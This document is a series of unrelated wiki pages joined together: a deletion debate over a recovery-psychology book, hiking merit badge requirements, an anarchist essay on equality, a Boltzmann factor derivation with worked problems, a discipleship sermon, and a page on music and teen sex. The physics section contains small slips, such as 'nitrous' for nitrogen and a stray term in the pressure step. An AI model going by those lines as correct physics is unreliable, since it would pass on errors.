: Seeing how, that the content supposedly also exists on Wikiversity (where it may well fit better), the principle author now interprets the subject to violate policy, and the defensive, if not combative, tone in [[User:Recovery Psychology|recoverypsychologist]]'s interaction with the community I will not oppose the deletion. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 08:57, 15 January 2009 (UTC)

: [[Image:Symbol keep vote.svg|15px]] '''Keep'''. Seems like an acceptable borderline case of OR to me. I think this appears to be OR only because it attempts to apply old concepts in a new way. I think there shouldn't be any problems that would push this book across the OR line, as long as the book makes a clear effort to remain factual, avoids NPOV problems, and personal interpretations are clearly identifiable. I think a NPOV problem for this type of work would be like the intentional omission of &quot;inconvenient facts&quot; or well documented criticism of the subject so as to mislead readers, which based on what recoverypsychologist has said is not the case. I think using coined terms are fine if explained and if useful for understanding the subject being covered, as (I think) is often the case when applying old concepts in new ways. I think rather than deleting this book, any missing references or misleading information should be fixed. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 11:14, 15 January 2009 (UTC)

:[[Image:Symbol delete vote.svg|15px]] '''Delete''' Synthesis is a form of original research; as such, it is inappropriate on Wikibooks. As well, it should be noted that even the &quot;fairly well cited&quot; section(s) are not cited well. &quot;APA, 1994&quot; is useless and &quot;Terri &amp; Lewinsohn, 1986&quot; is only slightly less so. Given what history on the topic I can find, I don't think writing a textbook on this is possible without synthesis, which is not appropriate for Wikibooks. Once there is synthesized, reliable, peer-reviewed sourcing for the topic one could consider writing a textbook. &amp;nbsp;'''&amp;mdash;&amp;nbsp;[[User:Mike.lifeguard|&lt;b style=&quot;color:#309;&quot;&gt;Mike.lifeguard&lt;/b&gt;]]'''&amp;nbsp;&amp;#124;&amp;nbsp;&lt;sup&gt;[[User talk:Mike.lifeguard|&lt;span style=&quot;color:#309;&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 05:30, 29 January 2009 (UTC)
:: While [[Wikibooks:Original research]] isn't exactly policy yet, I think it demonstrates that not all forms of OR may necessarily be inappropriate on Wikibooks. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 11:35, 29 January 2009 (UTC)
:::And probably never will as it doesn't cover books on humanistics. In this case we can use the present policy [[WB:WIW]] to raise some issues, like the Wikibookian is advancing his personal interpretation of the subject (this is further validate by the fact that he is, if I saw it correctly, the only Wikibookians contributing content to that book), so what is being argued is that it falls in '''Wikibooks is not a place to publish original works''', since we can't establish that the work is based on facts. Even if we can agree that it is not '''primary research in any field''', it does conform to the wording in the policy that defines such works, ''&quot;...as proposing theories and solutions, original ideas,...&quot;'', even if we agree that this work is not a singular or starting point to the presented view point, theories and solutions.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 20:56, 9 February 2009 (UTC)
:::Darklama, it's certainly true that we construe &quot;original research&quot; somewhat differently than English Wikipedia does, for example. However, I strongly believe that synthesis of this sort is inappropriate for Wikibooks. The reasons for this are discussed adequately at [[w:WP:SYNTH]] and related discussion pages. &amp;nbsp;'''&amp;mdash;&amp;nbsp;[[User:Mike.lifeguard|&lt;b style=&quot;color:#309;&quot;&gt;Mike.lifeguard&lt;/b&gt;]]'''&amp;nbsp;&amp;#124;&amp;nbsp;&lt;sup&gt;[[User talk:Mike.lifeguard|&lt;span style=&quot;color:#309;&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 01:43, 1 March 2009 (UTC)
:::: Well seeing as synthesis involves using multiple works to come to an original conclusion, how can you make that determination, if as you said previously, the cited sources are poorly cited? Have you been able to determine what the cited sources are now? recoverypsychologist said the work should not be seen as an attempt to misrepresent anything, so I believe there intent isn't to draw original conclusions. I think people's time would be better spent providing guidance for recoverypsychologist to help make the book more appropriate for Wikibooks. I think the decision should come down to whether recoverypsychologist feels like the book can be refined to be appropriate for Wikibooks while still being what he/she wanted the book to be. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 13:53, 1 March 2009 (UTC)
::::: I agree. While synthesis ''can'' be a form of original research, this isn't ''necessarily'' that the sense that it represents an original theory. The primary author wasn't too clear on what the text was about but the critisism of recovery being the restoration to some notion of &quot;[[w:Rosenhan experiment|normality]]&quot; or a perceived [http://www.google.com/search?hl=is&amp;client=opera&amp;rls=en&amp;hs=zOI&amp;ei=lj2rSZ9UkrCQBYOTqdMN&amp;sa=X&amp;oi=spell&amp;resnum=1&amp;ct=result&amp;cd=1&amp;q=psychiatric+drug+reliance&amp;spell=1 over-reliance] of drugs are new.
::::: Unfortunately, Recoverypsychology [[Special:Contributions/Recovery Psychology|seems to]] have left Wikibooks for the time being and has himself voted for deletion. I can think of two fair compromises: We could close this as delete on the grounds of concerns raised over the poor referencing which would be needed to determine whether this book is original research or not, ''and'' the departure and delete-vote of the original contributor. Alternatively, we could keep this and tag it with a note similar to {{tlx|unreferenced}} stating that the book ''may'' contain original research.  --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 02:44, 2 March 2009 (UTC)

Still being discussed? Well since it is, I will provide the following list of facts which should not be hard to find online; to critique as you wish.
#Remission is defined as the absence of symptomology.
#Recovery (one of many examples being Alcoholics Anonymous 1935) is defined as the presence of “so-called” normal behaviors.
#Recovery and Remission describe two separate phenomena. (or behaviors)
#Recovery is preferable to remission. (this may be just a self-evident; although surveys in medical psychology may beg to differ)
#Philosophically Abnormal/Clinical Psychology focus on Remission.
#Recovery is described in The Journal of Humanistic Psychology. 
#A so-called movement has termed itself as the “recovery movement,” this is primarily [http://www.Power2u.org] CSX (Consumer-Psychiatric Survivors-Ex-patients) members. In some places it is the [http://www.USPRA.org] Psychosocial Rehabilitation or Psychiatric Rehabilitation workers call themselves this movement. 
#This group of individuals calling themselves a political identity (CSX) is identified in the 1979 U.S. President’s Commission on Mental Health, the 1999 U.S. Surgeon Generals Report on Mental Health and were directly involved in serving on the 2001 U.S President’s Commission on Mental Health
#Harvard Lecturer Psychiatrist Sally Satel in her book P.C. M.D. How Political Correctness is Corrupting Medicine describes in her the second chapter of her book “The Lunatics Take over the Asylum” criticizes the “recovery movement” for it’s anti-psychiatry influence on litigation and mental health policy.
#This CSX movement is an international movement.
#Psychiatric Survivors or Survivors as CSX, refers to individuals with an anti-psychiatry attitude who feel they are in recovery from the damages caused by psychiatry itself.
#Those calling themselves Mental Health Consumers tend to be more pro-psychiatry. (The term Consumer is applied in the same way as the term &quot;consumer&quot; in economics)
#The CATIE study found newer antipsychotic medications to serve a “recovery” rather a “remission” utility in treating Schizophrenia.
#The Vermont Study found persons recovered from Schizophrenia at a higher rate than heart disease, cancer or diabetes.
#Anti-psychiatry beliefs have shifted from Rightist (Conservative) political rhetoric to Leftist (Liberal) political rhetoric in the past 50 years.  There is an explanation for this that can be described using the terminology from social psychology. 
#The most quoted testimonial of what recovery is unknowingly names: cognitive therapy, behavioral therapy and changing ones social situation.  A majority of the social workers and CSX persons who say they are this “recovery movement” are not well studied in clinical psychology.
#Digging a little harder the term &quot;recovery psychology&quot; has been used as a derogatory term used by sociologist professors to denote certain identity politic groups and movements that are seen as idiotic or frivolous.

:I'm sorry, this diatrabe smacks of advocacy of the worst sort. We do not and should not allow that on Wikibooks, and I still believe the book is inappropriate synthesis. As if the content of the text weren't questionable enough, I find the above to indicate to me there is nothing neutral going on here whatsoever, and I think Wikibooks would be well rid of this content. Either this is original research (and therefore inappropriate) or it is non-neutral advocacy (and therefore non-neutral), or it is both. I see no way Wikibooks can accept this project within our policies. &amp;nbsp;'''&amp;mdash;&amp;nbsp;[[User:Mike.lifeguard|&lt;b style=&quot;color:#309;&quot;&gt;Mike.lifeguard&lt;/b&gt;]]'''&amp;nbsp;&amp;#124;&amp;nbsp;&lt;sup&gt;[[User talk:Mike.lifeguard|&lt;span style=&quot;color:#309;&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 02:55, 27 April 2009 (UTC)

      <text xml:space="preserve"># Show that you know first aid for injuries or illnesses that could occur while hiking, including hypothermia, heatstroke, heat exhaustion, frostbite, dehydration, sunburn, sprained ankle, insect stings, tick bites, snakebite, blisters, hyperventilation, and altitude sickness.
# Explain and, where possible, show the points of good hiking practices. including the principles of Leave No Trace, hiking safety in the daytime and at night, courtesy to others, choice of footwear, and proper care of feet and footwear.
# Explain how hiking is an aerobic activity. Develop a plan for conditioning yourself for 10-mile hikes, and describe how you will increase your fitness for longer hikes.
# Make a written plan for a 10-mile hike, including map routes, a clothing and equipment list, and a list of items for a trail lunch.
# Take five hikes, each on a different day, and each of at least ten continuous miles. Prepare a hike plan for each hike.*
# Take a hike of 20 continuous miles in one day following a hike plan you have prepared.*
# After each of the hikes (or during each hike if on one continuous &quot;trek&quot;) in requirements 5 and 6, write a short report of your experience. Give dates and descriptions of routes covered, the weather, and interesting things you saw. Share this report with your merit badge counselor. 

* The hikes in requirements 5 and 6 can be used in fulfilling Second Class Rank (2a) and First Class Rank (3) rank requirements, but only if Hiking merit badge requirements 1, 2, 3, and 4 have been completed to the satisfaction of your counselor. The hikes of requirements 5 and 6 cannot be used to fulfill requirements of other merit badges.

      <text xml:space="preserve">==A.2.5 Why are anarchists in favour of equality?==

As mentioned in above, anarchists are dedicated to social equality because it is the only context in which individual liberty can flourish. However, there has been much nonsense written about &quot;equality,&quot; and much of what is commonly believed about it is very strange indeed. Before discussing what anarchist do mean by equality, we have to indicate what we do not mean by it.

Anarchists do not believe in &quot;equality of endowment,&quot; which is not only non-existent but would be very undesirable if it could be brought about. Everyone is unique. Biologically determined human differences not only exist but are '' &quot;a cause for joy, not fear or regret.&quot; '' Why? Because '' &quot;life among clones would not be worth living, and a sane person will only rejoice that others have abilities that they do not share.&quot; '' &lt;ref&gt;Noam Chomsky, Marxism, Anarchism, and Alternative Futures, p. 782&lt;/ref&gt;

That some people seriously suggest that anarchists means by &quot;equality&quot; that everyone should be identical is a sad reflection on the state of present-day intellectual culture and the corruption of words -- a corruption used to divert attention from an unjust and authoritarian system and side-track people into discussions of biology. '' &quot;The uniqueness of the self in no way contradicts the principle of equality,&quot; '' noted Erich Fromm, '' &quot;The thesis that men are born equal implies that they all share the same fundamental human qualities, that they share the same basic fate of human beings, that they all have the same inalienable claim on freedom and happiness. It furthermore means that their relationship is one of solidarity, not one of domination-submission. What the concept of equality does not mean is that all men are alike.&quot; ''&lt;ref&gt;The Fear of Freedom, p. 228&lt;/ref&gt; Thus it would be fairer to say that anarchists seek equality because we recognise that everyone is different and, consequently, seek the full affirmation and development of that uniqueness.

Nor are anarchists in favour of so-called &quot;equality of outcome.&quot; We have no desire to live in a society were everyone gets the same goods, lives in the same kind of house, wears the same uniform, etc. Part of the reason for the anarchist revolt against capitalism and statism is that they standardise so much of life (see George Reitzer's The McDonaldisation of Society on why capitalism is driven towards standardisation and conformity). In the words of Alexander Berkman:

&lt;blockquote&gt;
'' &quot;The spirit of authority, law, written and unwritten, tradition and custom force us into a common grove and make a man [or woman] a will-less automation without independence or individuality. . . All of us are its victims, and only the exceptionally strong succeed in breaking its chains, and that only partly.&quot; &lt;ref&gt;What is Anarchism?, p. 165&lt;/ref&gt; &lt;/blockquote&gt;

Anarchists, therefore, have little to desire to make this &quot;common grove&quot; even deeper. Rather, we desire to destroy it and every social relationship and institution that creates it in the first place.

&quot;Equality of outcome&quot; can only be introduced and maintained by force, which would not be equality anyway, as some would have more power than others! &quot;Equality of outcome&quot; is particularly hated by anarchists, as we recognise that every individual has different needs, abilities, desires and interests. To make all consume the same would be tyranny. Obviously, if one person needs medical treatment and another does not, they do not receive an &quot;equal&quot; amount of medical care. The same is true of other human needs. As Alexander Berkman put it:

&lt;blockquote&gt;'' &quot;equality does not mean an equal amount but equal opportunity. . . Do not make the mistake of identifying equality in liberty with the forced equality of the convict camp. True anarchist equality implies freedom, not quantity. It does not mean that every one must eat, drink, or wear the same things, do the same work, or live in the same manner. Far from it: the very reverse in fact.&quot; ''&lt;/blockquote&gt;

&lt;blockquote&gt;'' &quot;Individual needs and tastes differ, as appetites differ. It is equal opportunity to satisfy them that constitutes true equality.&quot; ''&lt;/blockquote&gt;

&lt;blockquote&gt;'' &quot;Far from levelling, such equality opens the door for the greatest possible variety of activity and development. For human character is diverse . . . Free opportunity of expressing and acting out your individuality means development of natural dissimilarities and variations.&quot; '' [Op. Cit., pp. 164-5]&lt;/blockquote&gt;

For anarchists, the &quot;concepts&quot; of &quot;equality&quot; as &quot;equality of outcome&quot; or &quot;equality of endowment&quot; are meaningless. However, in a hierarchical society, &quot;equality of opportunity&quot; and &quot;equality of outcome&quot; are related. Under capitalism, for example, the opportunities each generation face are dependent on the outcomes of the previous ones. This means that under capitalism &quot;equality of opportunity&quot; without a rough &quot;equality of outcome&quot; (in the sense of income and resources) becomes meaningless, as there is no real equality of opportunity for the off-spring of a millionaire and that of a road sweeper. Those who argue for &quot;equality of opportunity&quot; while ignoring the barriers created by previous outcomes indicate that they do not know what they are talking about -- opportunity in a hierarchical society depends not only on an open road but also upon an equal start. &gt;From this obvious fact springs the misconception that anarchists desire &quot;equality of outcome&quot; -- but this applies to a hierarchical system, in a free society this would not the case (as we will see).

Equality, in anarchist theory, does not mean denying individual diversity or uniqueness. As Bakunin observes:

&lt;blockquote&gt;'' &quot;once equality has triumphed and is well established, will various individuals' abilities and their levels of energy cease to differ? Some will exist, perhaps not so many as now, but certainly some will always exist. It is proverbial that the same tree never bears two identical leaves, and this will probably be always be true. And it is even more truer with regard to human beings, who are much more complex than leaves. But this diversity is hardly an evil. On the contrary. . . it is a resource of the human race. Thanks to this diversity, humanity is a collective whole in which the one individual complements all the others and needs them. As a result, this infinite diversity of human individuals is the fundamental cause and the very basis of their solidarity. It is all-powerful argument for equality.&quot; '' &lt;ref&gt;&quot;All-Round Education&quot;, The Basic Bakunin, pp. 117-8&lt;/ref&gt;&lt;/blockquote&gt;

Equality for anarchists means social equality, or, to use Murray Bookchin's term, the &quot;equality of unequals&quot; (some like Malatesta used the term &quot;equality of conditions&quot; to express the same idea). By this he means that an anarchist society recognises the differences in ability and need of individuals but does not allow these differences to be turned into power. Individual differences, in other words, '' &quot;would be of no consequence, because inequality in fact is lost in the collectivity when it cannot cling to some legal fiction or institution.&quot; '' &lt;ref&gt;Michael Bakunin, God and the State, p. 53&lt;/ref&gt;

If hierarchical social relationships, and the forces that create them, are abolished in favour of ones that encourage participation and are based on the principle of &quot;one person, one vote&quot; then natural differences would not be able to be turned into hierarchical power. For example, without capitalist property rights there would not be means by which a minority could monopolise the means of life (machinery and land) and enrich themselves by the work of others via the wages system and usury (profits, rent and interest). Similarly, if workers manage their own work, there is no class of capitalists to grow rich off their labour. Thus Proudhon:

&lt;blockquote&gt;
'' &quot;Now, what can be the origin of this inequality?&quot; ''
'' &quot;As we see it, . . . that origin is the realisation within society of this triple abstraction: capital, labour and talent.&quot; ''
&lt;/blockquote&gt;

&lt;blockquote&gt;'' &quot;It is because society has divided itself into three categories of citizen corresponding to the three terms of the formula. . . that caste distinctions have always been arrived at, and one half of the human race enslaved to the other. . . socialism thus consists of reducing the aristocratic formula of capital-labour-talent into the simpler formula of labour!. . . in order to make every citizen simultaneously, equally and to the same extent capitalist, labourer and expert or artist.&quot; '' &lt;ref&gt;No Gods, No Masters, vol. 1, pp. 57-8&lt;/ref&gt;&lt;/blockquote&gt;

Like all anarchists, Proudhon saw this integration of functions as the key to equality and freedom and proposed self-management as the means to achieve it. Thus self-management is the key to social equality. Social equality in the workplace, for example, means that everyone has an equal say in the policy decisions on how the workplace develops and changes. Anarchists are strong believers in the maxim &quot;that which touches all, is decided by all.&quot;

This does not mean, of course, that expertise will be ignored or that everyone will decide everything. As far as expertise goes, different people have different interests, talents, and abilities, so obviously they will want to study different things and do different kinds of work. It is also obvious that when people are ill they consult a doctor -- an expert -- who manages his or her own work rather than being directed by a committee. We are sorry to have to bring these points up, but once the topics of social equality and workers' self-management come up, some people start to talk nonsense. It is common sense that a hospital managed in a socially equal way will not involve non-medical staff voting on how doctors should perform an operation!

In fact, social equality and individual liberty are inseparable. Without the collective self-management of decisions that affect a group (equality) to complement the individual self-management of decisions that affect the individual (liberty), a free society is impossible. For without both, some will have power over others, making decisions for them (i.e. governing them), and thus some will be more free than others. Which implies, just to state the obvious, anarchists seek equality in all aspects of life, not just in terms of wealth. Anarchists '' &quot;demand for every person not just his [or her] entire measure of the wealth of society but also his [or her] portion of social power.&quot; '' &lt;ref&gt;Malatesta and Hamon, No Gods, No Masters, vol. 2, p. 20&lt;/ref&gt; Thus self-management is needed to ensure both liberty and equality.

Social equality is required for individuals to both govern and express themselves, for the self-management it implies means '' &quot;people working in face-to-face relations with their fellows in order to bring the uniqueness of their own perspective to the business of solving common problems and achieving common goals.&quot; '' &lt;ref&gt;George Benello, From the Ground Up, p. 160&lt;/ref&gt; Thus equality allows the expression of individuality and so is a necessary base for individual liberty.

Section F.3 (&quot;Why do 'anarcho'-capitalists place little or no value on equality?&quot;) discusses anarchist ideas on equality further. Noam Chomsky's essay &quot;Equality&quot; (contained in The Chomsky Reader) is a good summary of libertarian ideas on the subject.

      <text xml:space="preserve">Particles in a gas lose and gain energy at random due to collisions with each other. On average, over a large number of particles, the proportion of particles which have at least a certain amount of energy &amp;epsilon; is constant. This is known as the Boltzmann factor. It is a value between 0 and 1. The Boltzmann factor is given by the formula:

&lt;math&gt;\frac{n}{n_0} = e^{\frac{-\epsilon}{kT}}&lt;/math&gt;,

where n is the number of particles with kinetic energy above an energy level &amp;epsilon;, n&lt;sub&gt;0&lt;/sub&gt; is the total number of particles in the gas, T is the temperature of the gas (in kelvin) and k is the Boltzmann constant (1.38 x 10&lt;sup&gt;-23&lt;/sup&gt; JK&lt;sup&gt;-1&lt;/sup&gt;).

This energy could be any sort of energy that a particle can have - it could be gravitational potential energy, or kinetic energy, for example.

==Derivation==

In the atmosphere, particles are pulled downwards by gravity. They gain and lose gravitational potential energy (mgh) due to collisions with each other. First, let's consider a small chunk of the atmosphere. It has horizontal cross-sectional area A, height dh, molecular density (the number of molecules per. unit volume) n and all the molecules have mass m. Let the number of particles in the chunk be N.

&lt;math&gt;n = \frac{N}{V} = \frac{N}{A\; dh}&lt;/math&gt;

Therefore:

&lt;math&gt;V = A\;dh&lt;/math&gt; (which makes sense, if you think about it)

By definition:

&lt;math&gt;N = nV = nA\; dh&lt;/math&gt;

The total mass &amp;Sigma; m is the mass of one molecule (m) multiplied by the number of molecules (N):

&lt;math&gt;\Sigma m = mN = mnA\; dh&lt;/math&gt;

Then work out the weight of the chunk:

&lt;math&gt;W = g\Sigma m = nmgA\; dh&lt;/math&gt;

The downwards pressure P is force per. unit area, so:

&lt;math&gt;P = \frac{W}{A} = \frac{nmgA\; dh}{A} = nmg\; dh&lt;/math&gt;

We know that, as we go up in the atmosphere, the pressure decreases. So, across our little chunk there is a difference in pressure dP given by:

&lt;math&gt;dP = -nmg\; dh&lt;/math&gt; (1)
In other words, the pressure is decreasing (-) and it is the result of the weight of this little chunk of atmosphere. 

We also know that:

&lt;math&gt;PV = NkT&lt;/math&gt;

So:

&lt;math&gt;P = \frac{NkT}{V}&lt;/math&gt;

But:

&lt;math&gt;n = \frac{N}{V}&lt;/math&gt;

So, by substitution:

&lt;math&gt;P = nkT&lt;/math&gt;

So, for our little chunk:

&lt;math&gt;dP = kT\; dn&lt;/math&gt; (2)

If we equate (1) and (2):

&lt;math&gt;dP = -nmg\; dh = kT\; dn&lt;/math&gt;

Rearrange to get:

&lt;math&gt;\frac{dn}{dh} = \frac{-nmg}{kT}&lt;/math&gt;

&lt;math&gt;\frac{dh}{dn} = \frac{-kT}{nmg}&lt;/math&gt;

Integrate between the limits n&lt;sub&gt;0&lt;/sub&gt; and n:

&lt;math&gt;h = \frac{-kT}{mg}\int_{n_0}^n\frac{1}{n}\;dn = \frac{-kT}{mg}\left [ \ln{n} \right ]_{n_0}^n = \frac{-kT}{mg}\left ( \ln{n} - \ln{n_0}\right ) = \frac{-kT}{mg}\ln{\frac{n}{n_0}}&lt;/math&gt;

&lt;math&gt;ln{\frac{n}{n_0}} = \frac{-mgh}{kT}&lt;/math&gt;

&lt;math&gt;\frac{n}{n_0} = e^{\frac{-mgh}{kT}}&lt;/math&gt;

Since we are dealing with gravitational potential energy, &amp;epsilon; = mgh, so:

&lt;math&gt;\frac{n}{n_0} = e^{\frac{-\epsilon }{kT}}&lt;/math&gt;
==A Graph of this Function==

      <text xml:space="preserve">1u = 1.66 x 10&lt;sup&gt;-27&lt;/sup&gt; kg

g = 9.81 ms&lt;sup&gt;-2&lt;/sup&gt;

'''1. A nitrogen molecule has a molecular mass of 28u. If the Earth's atmosphere is 100% nitrous, with a temperature of 18°C, what proportion of nitrogen molecules reach a height of 2km?'''

&lt;math&gt;\epsilon = mgh = 28 \times 1.66 \times 10^{-27} \times 9.81 \times 2000 = 9.12 \times 10^{-22}\mbox{ J}&lt;/math&gt;

&lt;math&gt;\frac{n}{n_0} = e^{\frac{-9.12 \times 10^{-22}}{1.38 \times 10^{-23} \times 291}} = 0.797&lt;/math&gt;

So, 79.7% reach a height of at least 2km.

'''2. What proportion of the molecules in a box of hydrogen (molecular mass 2u) at 0°C have a velocity greater than 5ms&lt;sup&gt;-1&lt;/sup&gt;?'''

&lt;math&gt;\epsilon = \frac{1}{2}mv^2 = 0.5 \times 2 \times 1.66 \times 10^{-27} \times 5^2 = 4.15 \times 10^{-26}\mbox{ J}&lt;/math&gt;

&lt;math&gt;\frac{n}{n_0} = e^{\frac{-4.15 \times 10^{-26}}{1.38 \times 10^{-23} \times 273}} = 0.99999&lt;/math&gt;

(Practically all of them.)

'''3. What is the temperature of the hydrogen if half of the hydrogen is moving at at least 10ms&lt;sup&gt;-1&lt;/sup&gt;?'''

&lt;math&gt;\epsilon = \frac{1}{2}mv^2 = 0.5 \times 2 \times 1.66 \times 10^{-27} \times 10^2 = 1.66 \times 10^{-25}\mbox{ J}&lt;/math&gt;

&lt;math&gt;0.5 = e^{\frac{-\epsilon}{kT}}&lt;/math&gt;

&lt;math&gt;\ln{0.5} = -\ln{2} = \frac{-\epsilon}{kT}&lt;/math&gt;

&lt;math&gt;T = \frac{\epsilon}{k\ln{2}} = \frac{1.66 \times 10^{-25}}{1.38 \times 10^{-23} \times \ln{2}} = 0.0174\mbox{ K}&lt;/math&gt;

(almost absolute zero)

'''4. Some ionised hydrogen (charge -1.6 x 10&lt;sup&gt;-19&lt;/sup&gt; C)is placed in a uniform electric field. The potential difference between the two plates is 20V, and they are 1m apart. What proportion of the molecules are at least 0.5m from the positive plate (ignoring gravity) at 350°K?'''

&lt;math&gt;\epsilon = 0.5 \times 20 \times 1.6 \times 10^{-19} = 1.6 \times 10^{-18}\mbox{ J}&lt;/math&gt;

&lt;math&gt;\frac{n}{n_0} = e^{\frac{-1.6 \times 10^{-18}}{1.38 \times 10^{-23} \times 350}} \approx 0&lt;/math&gt;

They would all fly onto the positive plate.

      <text xml:space="preserve">&quot;Greater love has no one than this, than to lay down one's life for his friends. You are My friends if you do whatever I command you. No longer do I call you servants, for a servant does not know what his master is doing; but I have called you friends, for all things that I have heard from the Father, I have made known to you.&quot;  John 15:13-15

==THE CALL TO COVENANT RELATIONSHIP==
Believers in the new covenant have been elevated from servants to being friends of God.  This is the relationship which Abraham enjoyed with the Father, being called the &quot;friend of God&quot; (James 2:23-24).

Not just because of his faith in God, but because it was translated into his life through his actions. The basis of Abraham being called into this relationship with the Father was because of his obedience, as He said to Isaac, it was the reason why He was renewing the covenant with him which was made with his father, Abraham:
&quot;because Abraham obeyed My voice and kept My charge, My commandments, My statutes, and My laws.&quot;

The covenant relationship came after faithful service and so it was with the disciples, they entered into the new covenant relationship after having been faithful disciples for some three years or more.

We are called to be more than just believers, we are called to be faithful disciples in covenant relationship, a relationship based on friendship, on sharing both the wisdom, and the plans and purposes of the Master.  Discipleship is a yoking together in a spiritual union with Him where we are harnessed together in such a way that we are in step with Him as He takes us on the journey to our final destination.

Relationship is the essence of discipleship.  A disciple is one who follows the Master because of the claims the Master has on his heart, that is born out of love and respect.  He laid down His life for us, and the gratitude for what He has done for us, demands our life, our all.  

The focal point in discipleship is the one we follow, taking hold of the challenge and becoming like Him.

Through our encounter with Him and the resulting relationship into which He has drawn us, our hearts have been motivated to follow Him, i.e. to become His disciple.  It is a covenant relationship that requires our full commitment. To fulfill our commitment we must separate ourself from all other claims upon us. He must have first claim upon our life. Our devotion and loyalty must be to Him first, and from that orientation, to others. 

That is the only way that we will be undivided in our loyalty to Him and His claims upon us to obey Him in all situations. For if we love Him with all our heart, mind, soul and strength, we will obey His commands.

==YESHUA'S COMMANDMENTS==
Having come to a place where we desire to respond to His call and obey His commandments, we then consider just what are those commandments.  He said in John 13:34, &quot;A new commandment I give unto you, that you love one another&quot;.  But that cannot be the only commandment He has given us to live by, and it isn't. He gave much instruction to those who followed Him during His ministry and we have much of that recorded. 

His teaching was with authority and He brought out the depth of the understanding of the scriptures for the people and corrected the misconceptions of man's interpretations.  However, He did not change anything.

As He said, 
&quot;Do not think that I came to destroy the Law or the Prophets. I came not to destroy but to fulfill.
For assuredly, I say to you, till heavens and earth pass away, one jot or one tittle will by no means pass from the law till all is fulfilled.  Whoever therefore breaks one of the least of these commandments, and teaches men so, he shall be called least in the kingdom of heaven; but whoever does and teaches them, shall be called great in the kingdom of heaven.&quot;  Matthew 5:17-19

Yeshua's first statement here is that He did not come to destroy either the Law or the Prophets, but to fulfill them.  

How would He fulfill the Law?   --  By being the embodiment of the Law in human flesh.

How would He fulfill the Prophets?   --   By accomplishing all that was prophesied of Him in His life and death.

Then He said that not the smallest indicator of meaning in the Hebrew alphabet, would be passed over without being fulfilled.  Therefore, because of this, whoever advocated breaking the least of the commands in the law, would be demoted in the kingdom. Whoever breaks the commandments is a law-breaker, and a blind guide of the blind, leading others astray.

Yeshua set the example for us to follow, &quot;If you keep My commandments .. .. .. .. .. just as I have kept My Father's commandments&quot;, as the formula for abiding in His love.   John 15:10

Yeshua kept the Father's commandments and said that He had not come to destroy them, but that they would be preserved until they were fulfilled. By implication, that it was wrong for anyone to teach that they had been done away with, or could be broken.

There were some things that Yeshua fulfilled. He made a complete atonement for our sin so that we no longer need to offer sacrifices, He is now our sacrifice, offered once for all time (Hebrews 10:11-18). He has also become our High priest so that now direct access has been opened up to us to the throne of God (Heb.10:19-22)

He promised the believers that He would send the Holy Spirit from the Father who would take His place and be in them to enable them to keep the Law in its fullness, and to fulfill the commission which He had given to them with signs following.  It would be a spiritual impartation of His resurrected life that would empower them to walk in His ways.  The commandments of the Father which He kept, will be the commandments which the believer, through the impartation of His life, will now be enabled to keep. Those commandments were incorporated into His life, and that life is imparted to us.

So, Yeshua's commandments are the commandments of the Father lived through the power of the Holy Spirit. 

Yeshua said,  &quot;If any man loves Me, he will keep My word; and My Father will love him, and We will come to him and make our home with him.  He who does not love Me does not keep My words, and the word which you hear is not Mine but the Father's who sent Me.&quot;   John 14:23-24

His words are the Father's words, for He is the Word of God.  When His word is dwelling in us, then both the Father and the Son will dwell in us.  It is through us abiding in relationship with Him and His Word abiding in us, through our obedience to the Word, that we will have abiding communion with the Father and the Son.  

The Word abides in us when we make it part of our life (John 15: 7).

We have received a deposit of His life through the Holy Spirit which he said would be our Counsellor, Comforter, Teacher.  He said He would give the Holy Spirit to guide us in His absence and to teach us all things (John 15:25-26) which required specific instruction for our circumstances, the personal application of the Word to guide us.  This does not take the place of the ministry gifts of teaching (Ephesians 4:11), nor will it ever contradict the written Word, the commandments given by the Father through the Son.

&quot;But the anointing which you have received from Him abides in you, and you do not need that anyone should teach you; but as the same anointing teaches you concerning all things .. .. &quot;   1 John 2:27


The commandments of God given at Sinai written on tablets of stone were mediated through the Son, the Word of God.  The commandments of the Father written now upon our hearts of flesh, are imparted to us through His Son.

      <text xml:space="preserve">{{book title|Sex and Music|The Influence of Music in Sexual Behavior}}

Different types of music have been known to make impacts on sexual behavior to different people and different ages. Types of music can calm people’s senses down or fire them up; it can also be something that arouses people. 

==Songs, lyrics and teen sex==
Studies have shown that there is a strong link between the music that young teens listen to and sexual behaviors. The average teen listens to 1.5 to 2.5 hours of music every day. Many of these songs have sexual themes that can range from being romantic and playful to raunchy and degrading. &lt;ref&gt;http://www.ojp.usdoj.gov/newsroom/events/pdfs/apa_exposure.pdf&lt;/ref&gt;

Songs that depict men as sex studs and woman as sexual objects and have explicit references to sex acts are more likely to begin early sexual behavior than those where sexual references are more hidden and relationships appear more committed.

Teens who listened to lots of music with degrading sexual messages were almost twice as likely to start having intercourse or other sexual activities within the following two years as were teens who listened to little or no sexually degrading music. Girls who watch more than 14 hours of music videos are more likely to engage in unsafe sex with multiple partners and get STI. Boys who watch violent sex scenes on television have less sympathy to victims of sexual violence.

Among heavy listeners, 51 percent started having sex within two years, versus 29 percent of those who said they listened to little or no sexually degrading music. &lt;ref&gt;http://www.cbsnews.com/stories/2006/08/07/health/main1872510.shtml&lt;/ref&gt;

A new research study discovered teenagers who preferred popular songs with degrading sexual references were more likely to engage in intercourse or in precoital activities.

